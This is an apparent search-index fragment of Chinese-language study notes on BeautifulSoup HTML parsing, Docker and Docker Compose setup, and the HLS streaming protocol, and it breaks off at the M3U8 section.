<p>\u7ecf\u8fc7\u8fd9\u4e00\u6b65\u662f\uff0c\u6211\u4eec\u5df2\u7ecf\u5f97\u5230\u4e86\u4e00\u4e2aBeautifulSoup\u7684\u5bf9\u8c61\u4e86\u3002</p>"},{"location":"Record%26Review/BS4%E8%A7%A3%E6%9E%90HTML/#bs4_1","title":"BS4\u6293\u53d6\u6570\u636e","text":""},{"location":"Record%26Review/BS4%E8%A7%A3%E6%9E%90HTML/#_1","title":"\u7236\u5b50\u5143\u7d20\u76f4\u63a5\u8bbf\u95ee","text":"<p>html\u7ecf\u8fc7\u89e3\u6790\u540e\u5f62\u6210\u4e86\u4e00\u4e2a\u6811\u72b6\u7ed3\u6784\u3002\u4f8b\u5982\uff1a</p> <p><code>bs.title</code>\u5c31\u53ef\u4ee5\u76f4\u63a5\u83b7\u53d6HTML\u4e2d\u7684\u6807\u9898\u3002\u4e5f\u5c31\u662f\u83b7\u53d6\u4e86\u7684\u6807\u7b7e\uff1b <p><code>bs.a</code>\u53ef\u4ee5\u83b7\u53d6HTML\u4e2d\u7684\u7b2c\u4e00\u4e2a\u7684\u6807\u7b7e\uff1b <p><code>bs.javascript</code>\u53ef\u4ee5\u83b7\u53d6HTML\u4e2d\u7684\u7b2c\u4e00\u4e2a\u7684\u6807\u7b7e\u3002 <p>\u4f46\u662f\u8981\u6ce8\u610f\uff0c\u8fd9\u91cc\u83b7\u53d6\u7684\u6807\u7b7e\u662f\u5305\u62ec\u5b50\u6807\u7b7e\u7684\uff0c\u5e76\u4e14\u6ce8\u610f\uff0c\u8fd9\u4e2a\u6807\u7b7e\u5e76\u4e0d\u662f\u666e\u901a\u7684\u5b57\u7b26\u4e32\uff0c\u800c\u662f\u4e00\u4e2a\u5bf9\u8c61\uff0c\u4e5f\u662f\u4e00\u4e2aTAG\u7c7b\u7684\u5b9e\u4f8b\u3002\u6211\u4eec\u53ef\u4ee5\u901a\u8fc7\u8fd9\u4e2a\u5bf9\u8c61\u8bbf\u95ee\u5b83\u7684\u7236\u548c\u5b50\u5143\u7d20</p> <p>\u8bbf\u95eetag\u5bf9\u8c61\u7684\u7236\u5143\u7d20\uff1atag.parent</p> <p>\u8bbf\u95eetag\u5bf9\u8c61\u7684\u5b50\u5143\u7d20\uff1atag.contents</p> <p>PS:\u5b50\u5143\u7d20\u4e0d\u4e00\u5b9a\u53ea\u6709\u4e00\u4e2a\uff0c\u56e0\u6b64\u8fd4\u56de\u503c\u662f\u4e00\u4e2a\u5217\u8868\uff0c\u4e0d\u53ef\u4ee5\u76f4\u63a5\u4f7f\u7528\uff0c\u53ef\u4ee5\u904d\u5386\u6216\u8005\u901a\u8fc7\u4e0b\u6807\u8bbf\u95ee</p> <p>\u5982\u679c\u4f60\u8bd5\u7740<code>print(bs.title)</code>\u7684\u8bdd\uff0c\u4f60\u53ef\u80fd\u5bf9\u770b\u5230\u4e00\u4e0b\u7ed3\u679c\uff1a</p> <p>C:\\\\\u8fd9\u662f\u6807\u9898 <p>\u6ca1\u9519\uff0c\u5982\u679c\u76f4\u63a5\u8f93\u51faTAG\u5bf9\u8c61\u7684\u8bdd\uff0cPython\u4f1a\u628a\u4ed6\u7684\u6807\u7b7e\u8fde\u540c\u5185\u5bb9\u4e00\u8d77\u8f93\u51fa\uff08\u53ef\u80fd\u8fd8\u6709\u5b50\u5143\u7d20\uff09,\u4e5f\u5c31\u662f\u4ece\u5f00\u59cb\u6807\u7b7e\u7684\u4e00\u76f4\u5230\u7ed3\u675f\u6807\u7b7e\u7684\u5168\u90e8\u8f93\u51fa\u3002\u90a3\u4e48\u5982\u679c\u53ea\u60f3\u8981\u6807\u7b7e\u91cc\u9762\u7684\u6570\u636e\u5462\uff0c\u600e\u4e48\u529e\uff1f</p> <p>BS4\u5f53\u7136\u6709\u529e\u6cd5\uff0c\u5bf9\u4e8eTAG\u5bf9\u8c61\u6765\u8bb2\uff0c\u5176\u4e2d\u7684\u5185\u5bb9\u4e5f\u662f\u4ed6\u7684\u4e00\u4e2a\u5c5e\u6027\uff0c\u90a3\u5c31\u76f4\u63a5\u8bbf\u95ee\u54af\uff01</p> <p>TAG.string</p> <p>\u8fd9\u4fbf\u662fTAG\u5bf9\u8c61\u7684\u5185\u5bb9\uff0c\u8fd9\u91cc\u9762\u4e5f\u4e0d\u4f1a\u6709\u5b50\u5143\u7d20\u3002\u53ef\u4ee5\u96be\u9053\u8fd9\u4e2a\u5c31\u662f\u4e00\u4e2astirng\u6570\u636e\u5417\uff1f\u6211\u4eec\u53ef\u4ee5\u4f7f\u7528<code>type()</code>\u51fd\u6570\u6765\u770b\u4e00\u770b\uff1f<code>print(TAG.string)</code>\u8ba9\u6211\u4eec\u770b\u770b\u4ed6\u5230\u5e95\u662f\u4ec0\u4e48\u7c7b\u578b\u3002</p> <p> <p>\u662f\u7684\uff0c\u4ed6\u5e76\u4e0d\u662f\u4e00\u4e2astring\u7c7b\u578b\uff0c\u4ecd\u7136\u662felement\u4e2d\u7684\u4e00\u4e2a\u5c0f\u7c7b\uff0c\u56e0\u6b64\u54b1\u4eec\u8fd8\u53ef\u4ee5\u4f7f\u7528<code>NavigableString.parent</code>\u6765\u83b7\u53d6\u4ed6\u7684\u7236\u5143\u7d20\uff0c\u4e5f\u5c31\u662f\u90a3\u4e2aTAG</p>"},{"location":"Record%26Review/BS4%E8%A7%A3%E6%9E%90HTML/#beautifulsoup4","title":"BeautifulSoup4\u4e2d\u7684\u7c7b","text":""},{"location":"Record%26Review/BS4%E8%A7%A3%E6%9E%90HTML/#element","title":"Element","text":"<p>\u8fd9\u662f\u6240\u6709\u7c7b\u7684\u7236\u7c7b</p>"},{"location":"Record%26Review/BS4%E8%A7%A3%E6%9E%90HTML/#_2","title":"\u5c5e\u6027","text":"<ul> <li>name\uff1a\u6807\u7b7e\u540d\u79f0\uff0c\u5176\u5b9e\u4e5f\u5c31\u662f\u6807\u7b7e\u662f\u4ec0\u4e48\u7c7b\u578b\uff0c\u4f8b\u5982\u5bf9\u4e8e<code>&lt;title&gt;</code>\u6807\u7b7e\uff0c\u4ed6\u7684name\u5c31\u662ftitle</li> <li>parent\uff1a\u7236\u5143\u7d20\uff08\u6811\u72b6\u7ed3\u6784\uff09</li> <li>contents\uff1a\u5b50\u5143\u7d20\uff08list\u7ed3\u6784\uff09</li> </ul>"},{"location":"Record%26Review/BS4%E8%A7%A3%E6%9E%90HTML/#tag","title":"TAG","text":"<p>TAG\u7c7b\u662fBeautifulSoup\u5305\u4e2d\u6240\u6709\u7684\u7c7b\uff0c\u4ed6\u662f\u5728\u6587\u6863\u88ab\u89e3\u6790\u540e\u6240\u751f\u6210\u7684\u7c7b</p>"},{"location":"Record%26Review/BS4%E8%A7%A3%E6%9E%90HTML/#_3","title":"\u5c5e\u6027","text":"<ul> <li>string\uff1a\u5143\u7d20\u4e2d\u7684\u5185\u5bb9\uff0c\u4e00\u822c\u4e5f\u5c31\u662f\u6211\u4eec\u9700\u8981\u6293\u53d6\u7684\u6570\u636e</li> <li>attrs\uff1a\u5143\u7d20\u7684\u5c5e\u6027\uff0c\u56e0\u4e3a\u5c5e\u6027\u4e0d\u4e00\u5b9a\u53ea\u6709\u4e00\u4e2a\uff0c\u56e0\u6b64\u8fd4\u56de\u7684\u662f\u4e2a\u5b57\u5178\uff08dict\uff09\uff0c\u4e5f\u5c31\u662f\u952e\u503c\u5bf9\u7ec4\uff0c\u5c31\u76f8\u5f53\u4e8emaps\uff0c\u6bd4\u5982<code>bs.a.attrs</code>\u53ef\u4ee5\u83b7\u53d6\u4ed6\u7684<code>`href\u3001class</code>\uff0c\u4e0d\u8fc7\u53ef\u4ee5\u624d\u60f3\u5230\uff0c\u4ed6\u5e94\u8be5\u548c\u4e0a\u9762\u7684stirng\u4e00\u6837\uff0c\u4e5f\u662f\u4e00\u4e2a\u5bf9\u8c61\uff0c\u53ef\u4ee5\u901a\u8fc7<code>href.parent</code>\u8bbf\u95ee\u4ed6\u7684\u7236\u5143\u7d20\uff0c\u4e5f\u5c31\u662f\u5c5e\u6027\u6240\u6709\u8005\uff0c\u8fd9\u4fbf\u662f\u6811\u72b6\u7ed3\u6784\u7684\u4f53\u73b0\u3002"},{"location":"Record%26Review/BS4%E8%A7%A3%E6%9E%90HTML/#beautifulsoup","title":"BeautifulSoup","text":""},{"location":"Record%26Review/BS4%E8%A7%A3%E6%9E%90HTML/#_4","title":"\u5c5e\u6027","text":"<ul> <li>title\uff1a\u5c31\u662fdocument</li> <li>\u5176\u4e2d\u5305\u542b\u6240\u6709\u6570\u636e\uff0c\u53ef\u4ee5\u76f4\u63a5\u8bbf\u95ee\uff0c\u4f8b\u5982<code>beautifulsoup.a</code>,\u53ef\u4ee5\u62ff\u5230\u7b2c\u4e00\u4e2aa\u6807\u7b7e\u3002</li> </ul>"},{"location":"Record%26Review/BS4%E8%A7%A3%E6%9E%90HTML/#_5","title":"\u8282\u70b9\u83b7\u53d6\uff08\u6761\u4ef6\u8282\u70b9\uff09","text":""},{"location":"Record%26Review/BS4%E8%A7%A3%E6%9E%90HTML/#1-find_all","title":"1. find_all()","text":"<p>\u67e5\u627e\u6240\u6709\uff0c\u6bd4\u901a\u8fc7\u6811\u72b6\u7ed3\u6784\u8bbf\u95ee\u83b7\u5f97\u7684\u5143\u7d20\u66f4\u591a</p> <ul> <li>\u901a\u8fc7\u5b57\u7b26\u4e32\u67e5\u627e\uff1a</li> </ul> <p><code>find_all(\"a\")</code>\u627e\u5230\u6240\u6709<code>a</code>\u7684\u6807\u7b7e</p> <p>\u8fd8\u53ef\u4ee5\u4f7f\u7528\u5217\u8868\uff1a<code>find_all([\"a\",\"b\"])</code>\u4f1a\u5c06\u6240\u6709a\uff0cb\u6807\u7b7e\u8fd4\u56de</p> <ul> <li>\u6b63\u5219\u8868\u8fbe\u5f0f\u67e5\u627e\uff1a</li> </ul> <p><code>find_all(re.compile(\"a\"))</code>\u67e5\u627e\u6240\u6709\u6807\u7b7e\u4e2d\u542b\u6709a\u7684\u5143\u7d20\uff0c\u6bd4\u5982<code>head</code>\u3001<code>meta</code>\u7b49\u5f53\u7136\u4e0d\u6b62\u8fd9\u4e9b\uff0c\u5982\u679c\u4ed6\u7684\u5c5e\u6027\u91cc\u9762\u4e5f\u542b\u6709a\u4e5f\u4f1a\u88ab\u5305\u542b\u8fdb\u6765\uff0c\u6bd4\u5982<code>href</code>\u4e4b\u4e2d\u5982\u679c\u542b\u6709a\u5b57\u6837\uff0c\u4e5f\u4f1a\u5305\u542b\u3002</p> <ul> <li>\u81ea\u5b9a\u4e49\u67e5\u627e\uff1a\u4f20\u5165\u7684\u4e0d\u662f\u53c2\u6570\uff0c\u800c\u662f\u51fd\u6570\uff0c\u6ca1\u9519\uff0c\u8981\u77e5\u9053python\u53ef\u662fc\u8bed\u8a00\u5bb6\u65cf\u7684\uff0c\u6240\u4ee5\u51fd\u6570\u505a\u53c2\u6570\u4e5f\u65e0\u53ef\u539a\u975e\uff0c\u90a3\u5e94\u8be5\u600e\u4e48\u505a\u5462\uff1f</li> </ul> <pre><code>def name_is_exist(tag):\n    return tag.has_attr(\"name\")\nbeautiful.find_all(name_is_exist)\n#\u8fd9\u6837\u5c31\u4f1a\u628a\u6240\u6709\u4f20\u5165\u5e76\u8fd4\u56detrue\u7684\u6240\u6709\u6807\u7b7e\u653e\u56de\uff08list\uff09\uff0c\u4f46\u662f\u5c31\u4e0a\u9762\u8fd9\u4e2a\u7b97\u6cd5\uff0c\u8fd8\u6709\u4e2a\u66f4\u4f18\u7684\u65b9\u6cd5\nbeautiful.find_all(name=True)\n</code></pre> <ul> <li>\u8fdb\u9636\u6b63\u5219\u8868\u8fbe\u5f0f\uff08kwargs\uff09\uff1a\u4e0a\u9762\u4e00\u4e2a\u6b63\u5219\u8868\u8fbe\u5f0f\u7684\u67e5\u627e\u662f\u4e00\u79cd\u5341\u5206\u65e0\u8111\u7684\u4e1c\u897f\uff0c\u56e0\u4e3a\u4ed6\u4f1a\u65e0\u8111\u7684\u5728\u4e24\u4e2a\u5c16\u62ec\u53f7\u91cc\u9762\u76f4\u63a5\u67e5\u627e\uff0c\u6ca1\u6709\u9650\u5236\uff1b\u5982\u679c\u6211\u4eec\u60f3\u6307\u5b9a\u54ea\u4e2a\u5c5e\u6027\u7684\u503c\u7b26\u5408\u6b63\u5219\u600e\u4e48\u529e\uff1f</li> </ul> <pre><code>beautiful.find_all(class_=re.compile(\"\\d\"))\n#\u53ef\u4ee5\u67e5\u627e\u6240\u6709\u7c7b\u540d\u4e2d\u542b\u6570\u7ec4\u7684\u6807\u7b7e\n</code></pre> <ul> <li>\u9650\u5b9a\u641c\u7d22\uff1a</li> </ul> <p>\u4f7f\u7528<code>find_all()</code>\u65f6\u4f20\u53c2<code>limit=4</code></p>"},{"location":"Record%26Review/BS4%E8%A7%A3%E6%9E%90HTML/#2cssselect","title":"2.css\u9009\u62e9\u5668\uff08select\uff09","text":"<pre><code>beautiful.select(\"div.title\")\n#\u8fd4\u56de\u6240\u6709div\u4e0b\u7684title\u7684\u6807\u7b7e\nbeautiful.select(\".display\")\n#\u8fd4\u56de\u6240\u6709display\u7c7b\u7684\u6807\u7b7e\nbeautiful.select(\"#username\")\n#\u8fd4\u56de\u6240\u6709id\u4e3ausername\u7684\u6807\u7b7e\nbeautiful.select(\"a[class='bri']\")\n#\u8fd4\u56de\u6240\u6709class\u4e3abri\u7684a\u6807\u7b7e\nbeautiful.select(\"div &gt; a\")\n#\u8fd4\u56de\u6240\u6709div\u4e0b\u7684a\u6807\u7b7e\nbeautiful.select(\"#cs ~ ul\")\n#\u8fd4\u56de\u6240\u6709\u548cid\u4e3acs\u7684\u6807\u7b7e\u540c\u4e00\u7ea7\u7684ul\u6807\u7b7e\n#\u8be6\u7ec6\u8bed\u6cd5\u89c1css\u9009\u62e9\u5668\n</code></pre>"},{"location":"Record%26Review/Docker%E5%92%8CDockerCompose%E7%9A%84%E4%BD%BF%E7%94%A8/","title":"Docker\u548cDockerCompose\u7684\u4f7f\u7528","text":""},{"location":"Record%26Review/Docker%E5%92%8CDockerCompose%E7%9A%84%E4%BD%BF%E7%94%A8/#docker","title":"Docker","text":"<p>Docker\u9700\u8981\u5199Dockerfile\u6587\u4ef6\uff0c\u767b\u5f55\u63a5\u53e3\u7684Dockerfile\u793a\u4f8b\u5982\u4e0b</p> <pre><code>FROM openjdk:19\nENV TZ=Asia/Shanghai\nCOPY *.jar /app.jar\nEXPOSE 8080\nENTRYPOINT [\"java\", \"-jar\" ,\"-Dspring.profiles.active=dev\", \"/app.jar\"]\n</code></pre> <p>\u8fd9\u91cc\u6709\u51e0\u4e2a\u9700\u8981\u6ce8\u610f\u7684\u70b9</p> <ul> <li>Dockerfile\u7684RUN\u547d\u4ee4\u4f1a\u5728\u6784\u5efa\u955c\u50cf\u65f6\u6267\u884c\uff0c\u800c\u4e0d\u662f\u542f\u52a8\u5bb9\u5668\u65f6\u6267\u884c\uff0c\u56e0\u6b64\u5e94\u7528\u7684\u542f\u52a8\u547d\u4ee4\u7528<code>ENTRYPOINT</code></li> <li>Dockerfile\u4e2d\u5efa\u8bae\u6307\u5b9a\u8fd0\u884c\u73af\u5883\uff0c\u4f7f\u7528\u53c2\u6570<code>-Dspring.profiles.active=dev</code>\uff0c\u5176\u4e2d<code>dev</code>\u8868\u793a\u7684\u662f\u914d\u7f6e\u6587\u4ef6\u7684\u540e\u7f00\uff0c\u672c\u4f8b\u5b50\u4e2d\u5c31\u662f\u662fapplication-dev.yaml\u751f\u6548\u3002</li> <li>\u5efa\u8bae\u672c\u5730\u73af\u5883\u548c\u8fd0\u884c\u73af\u5883\u7684\u914d\u7f6e\u6587\u4ef6\u5206\u79bb\uff0c\u5728\u8fd0\u884c\u65f6\u901a\u8fc7\u5236\u5b9a\u73af\u5883\u662f\u4e0d\u540c\u7684\u914d\u7f6e\u751f\u6548\u3002\u8fd9\u6837\u53ef\u4ee5\u4e00\u6b21\u6784\u5efa\uff0c\u591a\u73af\u5883\u90e8\u7f72\u3002\u51cf\u5c11\u6210\u672c\u3002</li> </ul>"},{"location":"Record%26Review/Docker%E5%92%8CDockerCompose%E7%9A%84%E4%BD%BF%E7%94%A8/#docker-compose","title":"Docker-Compose","text":"<p>Docker-Compose\u9700\u8981\u7f16\u5199compose.yaml\u6587\u4ef6\u6765\u6784\u5efa\uff0c\u8fd8\u65f6\u4e0a\u9762\u7684\u4f8b\u5b50</p> <pre><code>services:\n  logindb:                              # \u670d\u52a1\u540d\u79f0\n    image: 'mysql:latest'                # \u955c\u50cf\u540d\u79f0\n    environment:                        # \u73af\u5883\u53d8\u91cf\n      - 'MYSQL_ROOT_PASSWORD=root'        # MYSQL\u7684\u5bc6\u7801    \n  loginservice:                         # web\u670d\u52a1\u540d\u79f0\n    build: ./login                      # \u6784\u5efa\u7684\u8def\u5f84\n    ports:\n      - \"8080:8080\"                     # \u5bf9\u5916\u66b4\u9732\u7684\u7aef\u53e3\n</code></pre> <p>\u8fd9\u91cc\u7684\u51e0\u4e2a\u6ce8\u610f\u70b9\uff1a</p> <ul> <li>\u5728\u540c\u4e00\u4e2acompose\u6784\u5efa\u7684\u5404\u4e2a\u670d\u52a1\u53ef\u4ee5\u901a\u8fc7\u670d\u52a1\u540d\u6765\u4e92\u76f8\u8bbf\u95ee\uff0c\u6bd4\u5982\u8fd9\u91cc\u7684\u6570\u636e\u5e93\u670d\u52a1\u540d\u79f0\u662flogindb\uff0c\u90a3\u4e48\u6211\u4eec\u5728loginservice\u7aef\u5c31\u53ef\u4ee5\u901a\u8fc7<code>jdbc:mysql://logindb:3306?serverTimezone=UTC</code>\u6765\u8bbf\u95ee\u6570\u636e\u5e93\u3002</li> <li>\u6570\u636e\u5e93\u7684\u7aef\u53e3\u5982\u679c\u4e0d\u60f3\u5bf9\u5916\u66b4\u9732\uff0c\u5c31\u4e0d\u9700\u8981\u5199\u51fa\u6765\u7aef\u53e3\u6620\u5c04\uff0cDocker-Compose\u4e3a\u6211\u4eec\u5728\u7f51\u7edc\u5185\u90e8\u505a\u4e86\u6620\u5c04\uff0c\u8fd9\u6837\u5b50\u5c31\u53ef\u4ee5\u8ba9\u6570\u636e\u5e93\u53ea\u80fd\u901a\u8fc7\u5185\u90e8\u8bbf\u95ee\u3002\u8fd9\u4e0d\u4ec5\u4ec5\u53ef\u7528\u4e8e\u4fdd\u62a4\u6570\u636e\u5e93\u5b89\u5168\uff0c\u4e5f\u53ef\u4ee5\u7528\u6765\u505a\u540e\u671f\u7684\u7f51\u5173\u4ee3\u7406</li> <li><code>build</code>\u53c2\u6570\u6307\u5b9a\u9700\u8981\u6784\u5efa\u7684\u8def\u5f84\uff0c\u5982\u679c\u6ca1\u6709<code>build</code>\uff0c\u8868\u793a\u4f7f\u7528\u8fdc\u7a0b\u7684\u6216\u8005\u5df2\u7ecf\u6784\u5efa\u597d\u7684\u3002<code>build</code>\u7684\u8def\u5f84\u4e0b\u7684\u5fc5\u987b\u8981\u6709Dockerfile\u6587\u4ef6\uff0c\u5426\u5219\u65e0\u6cd5\u6784\u5efa\u3002</li> <li><code>ports</code>\u53c2\u6570\u8868\u793a\u8be5\u670d\u52a1\u548c\u5bbf\u4e3b\u673a\u7684\u7aef\u53e3\u6620\u5c04\u3002</li> <li>\u66f4\u591a\u914d\u7f6e\u6587\u4ef6\u7684\u53c2\u6570\u53ef\u89c1\u5b98\u7f51\u6216\u8005Docker Compose | \u83dc\u9e1f\u6559\u7a0b (runoob.com)</li> </ul> <p>\u7f16\u5199\u597dcompose\u6587\u4ef6\u4ee5\u540e\uff0c\u6211\u4eec\u5c31\u53ef\u4ee5\u5728\u540c\u4e00\u7ea7\u76ee\u5f55\u4e0b\u4f7f\u7528\u547d\u4ee4docker-compose\u547d\u4ee4\u4e86\uff08\u524d\u63d0\u662f\u5b89\u88c5docker-compose\uff0c\u6559\u7a0b\u7f51\u4e0a\u6709\uff09</p> <ul> <li><code>docker-compose up -d</code>\uff1a\u540e\u53f0\u6784\u5efa\u5e76\u4e14\u542f\u52a8compose\u4e2d\u7684\u5404\u4e2a\u670d\u52a1</li> <li><code>docker-compose down</code>\uff1a\u505c\u6b62\u5e76\u4e14\u9500\u6bc1\u5f53\u524d\u76ee\u5f55\u4e0bcompose\u6587\u4ef6\u4e2d\u7684\u6240\u6709\u670d\u52a1\u3002\u5e76\u4e14\u5220\u9664\u7f51\u7edc\uff08\u5b9e\u9645\u5f00\u53d1\u4e2d\u8c28\u614e\u4f7f\u7528\uff09\u3002</li> <li><code>docker-compose stop</code>\uff1a\u505c\u6b62\u5f53\u524d\u5bb9\u5668\uff0c\u4e0d\u9500\u6bc1</li> <li><code>docker-compose start</code>\uff1a\u542f\u52a8\u505c\u6b62\u4e86\u7684\u5bb9\u5668</li> </ul> <p>\u53c2\u8003</p> <p>Docker-Compose\u5e38\u7528\u547d\u4ee4 - \u6625\u5149\u725b\u725b - \u535a\u5ba2\u56ed (cnblogs.com)</p> <p>Docker Compose | \u83dc\u9e1f\u6559\u7a0b (runoob.com)</p>"},{"location":"Record%26Review/HLS%E9%9F%B3%E8%A7%86%E9%A2%91%E4%BF%9D%E5%AD%98%E8%AF%A6%E8%A7%A3/","title":"HLS\u97f3\u89c6\u9891\u4fdd\u5b58\u8be6\u89e3","text":"<p>\u53c2\u8003\u8d44\u6599\uff1a</p> <p>\u3010\u97f3\u89c6\u9891\u5f00\u53d1\u5b66\u4e60\uff1aHLS \u534f\u8bae\u8be6\u89e3 - \u77e5\u4e4e (zhihu.com)\u3011</p> <p>\u3010m3u8 \u6587\u4ef6\u683c\u5f0f\u8be6\u89e3 - \u7b80\u4e66 (jianshu.com)\u3011</p> <p>\u3010\u4e86\u89e3 HLS \u6d41\u5a92\u4f53 - \u63a2\u7d22 - Apple Developer\u3011</p> <p>\u3010RFC 8216 - HTTP Live Streaming (ietf.org)\u3011</p> <p>\u3010RFC 2038 - RTP Payload Format for MPEG1/MPEG2 Video (ietf.org)\u3011</p> <p>\u3010Opencv HSL video stream to web (funvisiontutorials.com)\u3011</p> <p>\u3010MPEG2-TS - \u7ef4\u57fa\u767e\u79d1\uff0c\u81ea\u7531\u7684\u767e\u79d1\u5168\u4e66 (wikipedia.org)\u3011</p>"},{"location":"Record%26Review/HLS%E9%9F%B3%E8%A7%86%E9%A2%91%E4%BF%9D%E5%AD%98%E8%AF%A6%E8%A7%A3/#_1","title":"\u5f15\u5165","text":""},{"location":"Record%26Review/HLS%E9%9F%B3%E8%A7%86%E9%A2%91%E4%BF%9D%E5%AD%98%E8%AF%A6%E8%A7%A3/#hls_1","title":"HLS\u662f\u4ec0\u4e48","text":"<p>HLS \u5168\u79f0\u662f HTTP Live Streaming\uff0c \u662f\u4e00\u4e2a\u7531 Apple \u516c\u53f8\u5b9e\u73b0\u7684\u57fa\u4e8e HTTP \u7684\u5a92\u4f53\u6d41\u4f20\u8f93\u534f\u8bae\u3002 \u4ed6\u8ddf DASH \u534f\u8bae\u7684\u539f\u7406\u975e\u5e38\u7c7b\u4f3c\u3002\u901a\u8fc7\u5c06\u6574\u6761\u6d41\u5207\u5272\u6210\u4e00\u4e2a\u5c0f\u7684\u53ef\u4ee5\u901a\u8fc7 HTTP \u4e0b\u8f7d\u7684\u5a92\u4f53\u6587\u4ef6\uff0c\u7136\u540e\u63d0\u4f9b\u4e00\u4e2a\u914d\u5957\u7684\u5a92\u4f53\u5217\u8868\u6587\u4ef6\uff0c\u63d0\u4f9b\u7ed9\u5ba2\u6237\u7aef\uff0c\u8ba9\u5ba2\u6237\u7aef\u987a\u5e8f\u5730\u62c9\u53d6\u8fd9\u4e9b\u5a92\u4f53\u6587\u4ef6\u64ad\u653e, \u6765\u5b9e\u73b0\u770b\u4e0a\u53bb\u662f\u5728\u64ad\u653e\u4e00\u6761\u6d41\u7684\u6548\u679c\u3002</p>"},{"location":"Record%26Review/HLS%E9%9F%B3%E8%A7%86%E9%A2%91%E4%BF%9D%E5%AD%98%E8%AF%A6%E8%A7%A3/#hls_2","title":"\u4e3a\u4f55\u9009\u62e9HLS","text":"<p>\u7531\u4e8e\u4f20\u8f93\u5c42\u534f\u8bae\u53ea\u9700\u8981\u6807\u51c6\u7684 HTTP \u534f\u8bae\uff0cHLS \u53ef\u4ee5\u65b9\u4fbf\u7684\u900f\u8fc7\u9632\u706b\u5899\u6216\u8005\u4ee3\u7406\u670d\u52a1\u5668\uff0c\u800c\u4e14\u53ef\u4ee5\u5f88\u65b9\u4fbf\u7684\u5229\u7528 CDN \u8fdb\u884c\u5206\u53d1\u52a0\u901f\uff0c\u5e76\u4e14\u5ba2\u6237\u7aef\u5b9e\u73b0\u8d77\u6765\u4e5f\u5f88\u65b9\u4fbf\u3002</p> <p>HLS\u76ee\u524d\u5728\u6d41\u5a92\u4f53\u9886\u57df\u6709\u7740\u5e7f\u6cdb\u7684\u8fd0\u7528\uff0c\u5728\u4e92\u8054\u7f51\u4e0a\u4e5f\u80fd\u591f\u627e\u5230\u5927\u91cf\u7684\u8d44\u6599\u597d\u524d\u4eba\u7559\u4e0b\u7684\u7ecf\u9a8c\u548c\u5efa\u8bae\uff0c\u8fd9\u5bf9\u4e8e\u9700\u8981\u8fc5\u6377\u5f00\u53d1\u548c\u7ef4\u62a4\u7684\u9879\u76ee\u65e0\u7591\u662f\u4e00\u4e2a\u6700\u4f73\u7684\u9009\u62e9\uff0c\u540c\u65f6\u4f7f\u7528HLS\u8fd9\u9879\u6280\u672f\u6211\u4e5f\u662f\u8003\u8651\u5230\u517c\u5bb9\u65b0\u7684\u95ee\u9898\uff0c\u76ee\u524d\u5bf9\u4e8e\u591a\u5e73\u53f0\u517c\u5bb9\u6027\u6700\u597d\u7684\u5f53\u5c5eHTTP\u534f\u8bae\uff0c\u56e0\u6b64\u9009\u62e9\u57fa\u4e8eHTTP\u534f\u8bae\u7684\u6d41\u5f0f\u5a92\u4f53\u4f20\u8f93\u80fd\u591f\u7ed9\u9879\u76ee\u5e26\u6765\u66f4\u5927\u7684\u7075\u6d3b\u6027\u548c\u517c\u5bb9\u6027\u3002</p>"},{"location":"Record%26Review/HLS%E9%9F%B3%E8%A7%86%E9%A2%91%E4%BF%9D%E5%AD%98%E8%AF%A6%E8%A7%A3/#hls_3","title":"HLS\u534f\u8bae","text":"<p>\u4e0a\u9762\u662fHLS\u534f\u8bae\u7684\u6574\u4f53\u67b6\u6784</p> <p>\u9996\u5148\u662f\u89c6\u5c4f\u6765\u6e90\uff08\u6444\u50cf\u673a\u7b49\uff09\u5c06\u83b7\u53d6\u5230\u7684\u5b9e\u65f6\u753b\u9762\u5199\u5165\u5a92\u4f53\u7f16\u7801\u5668\uff0c\u7136\u540e\u518d\u7531\u670d\u52a1\u5668\u901a\u8fc7MPEG-2\u91cd\u65b0\u7f16\u7801\u3001\u5207\u7247\u3002\u540c\u65f6\u751f\u6210\u4e00\u4e2a\u7d22\u5f15\u6587\u4ef6\uff0c\u4e5f\u53ef\u4ee5\u79f0\u4e4b\u4e3a\u64ad\u653e\u5217\u8868\u6587\u4ef6\uff0c\u53d1\u9001\u7ed9\u5206\u53d1\u5668\uff0c\u63a5\u7740\u5ba2\u6237\u7aef\u53ea\u9700\u8981\u901a\u8fc7\u6d4f\u89c8\u5668\uff08HTTP\u534f\u8bae\uff09\u83b7\u53d6\u5230\u7d22\u5f15\u6587\u4ef6\uff0c\u4fbf\u53ef\u4ee5\u81ea\u52a8\u5bf9\u4e8e\u7d22\u5f15\u6587\u4ef6\u4e2d\u7684\u64ad\u653e\u7247\u6bb5\u8fdb\u884cHTTP\u8bf7\u6c42\uff0c\u89e3\u7801\u4ee5\u53ca\u63a7\u5236\u64ad\u653e\u987a\u5e8f\u3002</p> <p>\u9488\u5bf9\u4e8e\u672c\u9879\u76ee\uff0c\u6211\u4eec\u5bf9\u4e8e\u7f51\u7edc\u4e0a\u7ed9\u51fa\u7684\u9879\u76ee\u67b6\u6784\u505a\u51fa\u4e86\u8c03\u6574\u3002\u5927\u81f4\u67b6\u6784\u5982\u4e0b\uff1a</p> <p></p> <p>\u6211\u4eec\u5c06\u89c6\u5c4f\u7f16\u7801\u5de5\u4f5c\u8c03\u6574\u5230\u4e0b\u4f4d\u91c7\u6837\u673a\uff08\u6444\u50cf\u673a\uff09\u7aef\u5b8c\u6210\uff0c\u800c\u670d\u52a1\u7aef\u53ea\u9700\u8981\u8d1f\u8d23\u7f16\u7801\u5de5\u4f5c\uff0c\u4ece\u4e0b\u4f4d\u673a\u53d1\u9001\u7684ts\u6587\u4ef6\u901a\u8fc7\u4f4e\u5ef6\u8fdf\u7684KCP\u7f51\u7edc\u534f\u8bae\u4f20\u8f93\u3002\u8fd9\u6837\u4e0d\u4ec5\u5206\u62c5\u4e86\u4e2d\u592e\u670d\u52a1\u5668\u7684\u538b\u529b\uff0c\u800c\u4e14\u8fd8\u80fd\u591f\u5728\u4e0b\u4f4d\u673a\u4fdd\u5b58\u539f\u59cb\u6570\u636e\uff0c\u540c\u65f6\u4e5f\u65b9\u4fbf\u7ba1\u7406\u4eba\u5458\u76f4\u63a5\u5728\u4e0b\u4f4d\u673a\u67e5\u770b\u89c6\u9891\uff08\u4e0b\u4f4d\u673a\u4e0a\u9762\u4e5f\u7531\u4e00\u4e2a\u81ea\u52a8\u7f16\u6392\u7d22\u5f15\u6587\u4ef6\u7684\u529f\u80fd\uff09</p>"},{"location":"Record%26Review/HLS%E9%9F%B3%E8%A7%86%E9%A2%91%E4%BF%9D%E5%AD%98%E8%AF%A6%E8%A7%A3/#m3u8","title":"\u7d22\u5f15\u6587\u4ef6M3U8","text":"<p>m3u8 